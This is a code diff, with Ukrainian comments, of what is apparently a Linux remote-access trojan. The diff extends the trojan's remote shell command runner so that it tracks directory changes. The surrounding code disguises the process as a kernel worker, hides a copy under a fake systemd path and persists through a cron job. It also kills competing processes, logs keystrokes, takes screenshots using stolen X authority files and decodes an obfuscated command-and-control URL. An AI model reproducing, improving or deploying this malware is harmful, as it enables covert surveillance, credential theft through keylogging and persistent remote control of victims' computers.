@@ -27,6 +27,8 @@ X_KEY = "AMY_2026_SECRET"
 FAKE_NAME = "[kworker/u2:1-events]"
 
 log_buffer = []
+# Змінна для відстеження стану поточної директорії
+current_dir = os.getcwd()
 
 def get_url(): 
     try: return base64.b64decode(_S).decode()
@@ -67,7 +69,6 @@ def kill_others():
                 parts = line.strip().split()
                 if not parts: continue
                 pid = int(parts[0])
-                # Вбиваємо тільки якщо це не ми, не наш бінарник в SSH і не оболонка
                 if pid != my_pid and pid != parent_pid:
                     try: os.kill(pid, signal.SIGKILL)
                     except: pass
@@ -77,19 +78,18 @@ def is_singleton():
     """Запобігає запуску дублів через абстрактні сокети"""
     try:
         s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        s.bind('\0amy_2026_singleton_lock')
+        s.bind('\0amy_2026_singleton_lock_final')
         return s
     except socket.error:
         return None
 
 def ghost_install():
-    """Закріплення в cron з очищенням старих записів"""
+    """Закріплення в cron з оновленням бінарного файлу"""
     try:
         p = os.path.expanduser("~/.local/share/systemd-service")
         os.makedirs(p, exist_ok=True)
         target = os.path.join(p, "sys-update")
         
-        # Копіюємо бінарник або скрипт
         if not os.path.exists(target) or os.path.getsize(sys.argv[0]) != os.path.getsize(target):
             shutil.copy2(sys.argv[0], target)
             os.chmod(target, 0o755)
@@ -97,7 +97,6 @@ def ghost_install():
         cron_job = f"*/2 * * * * {target} >/dev/null 2>&1"
         current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
         if target not in current_cron:
-            # Очищуємо старі записи AMY і додаємо новий
             clean_lines = [l for l in current_cron.splitlines() if "sys-update" not in l and l.strip()]
             clean_lines.append(cron_job)
             new_cron = "\n".join(clean_lines) + "\n"
@@ -106,13 +105,31 @@ def ghost_install():
     except: pass
 
 async def run_shell(cmd):
-    """Виконує команду з чистим виводом та відновленим PATH"""
+    """Виконує команду з підтримкою зміни директорій (cd) та відстеженням PATH"""
+    global current_dir
     try:
+        parts = cmd.split()
+        # Спеціальна обробка команди 'cd' всередині процесу бота
+        if parts and parts[0] == "cd":
+            new_path = parts[1] if len(parts) > 1 else os.path.expanduser("~")
+            # Спроба змінити директорію
+            try:
+                os.chdir(os.path.join(current_dir, new_path))
+                current_dir = os.getcwd()
+                return f"(директорію змінено на: {current_dir})"
+            except Exception as e:
+                return f"Помилка cd: {str(e)}"
+
         env = os.environ.copy()
         env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
         
+        # Виконуємо команду в поточній відстежуваній директорії
         proc = await asyncio.create_subprocess_shell(
-            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
+            cmd, 
+            stdout=asyncio.subprocess.PIPE, 
+            stderr=asyncio.subprocess.PIPE, 
+            env=env,
+            cwd=current_dir
         )
         stdout, stderr = await proc.communicate()
         res = stdout.decode().strip() + stderr.decode().strip()
@@ -121,11 +138,10 @@ async def run_shell(cmd):
         return f"Shell Error: {str(ex)}"
 
 def take_screenshot_sync():
-    """Захоплення екрана з підтримкою X11 та root"""
+    """Захоплення екрана (X11/Root)"""
     if not ImageGrab: return None
     try:
         if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
-        # Пошук прав доступу до дисплея
         for p in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
             if os.path.exists(p):
                 os.environ['XAUTHORITY'] = p
@@ -154,23 +170,19 @@ def on_press(key):
         else: log_buffer.append(f"[{key.name}]")
 
 async def start():
-    # 1. Singleton check
     lock = is_singleton()
     if not lock: sys.exit(0)
 
-    # 2. Очищення та підготовка
     kill_others()
     masquerade()
     ghost_install()
     
-    # 3. Кейлоггер
     if keyboard:
         try:
             listener = keyboard.Listener(on_press=on_press)
             listener.start()
         except: pass
 
-    # 4. Статичний HWID
     b_id = hex(uuid.getnode())[2:10]
     
     while True:
